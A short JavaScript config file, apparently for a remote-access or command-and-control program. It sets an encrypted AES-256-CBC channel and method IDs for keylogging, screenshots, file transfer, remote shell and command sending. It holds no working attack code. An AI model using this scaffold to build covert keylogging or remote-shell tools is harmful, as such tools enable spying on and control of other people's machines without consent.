/**
 * Config file
 */
export default {
  connection: {
    ALIVE_PERIOD: 10000,
    MAX_RETRY_TIMES: 3,
    MAX_SEQUENCE_NUMBER: 65536,
    RESPONSE_TIMEOUT: 30000
  },
  transfer: {
    CIPHER_ALGORITHM: 'AES-256-CBC'
  },
  methodID: {
    DISCONNECT: 1,
    KEYLOGGER: 2,
    SCREENSHOT: 3,
    transFile: 4,
    getFilePreview: 5,
    SHELL: 6,
    SENDCOMMAND: 7
  }
}
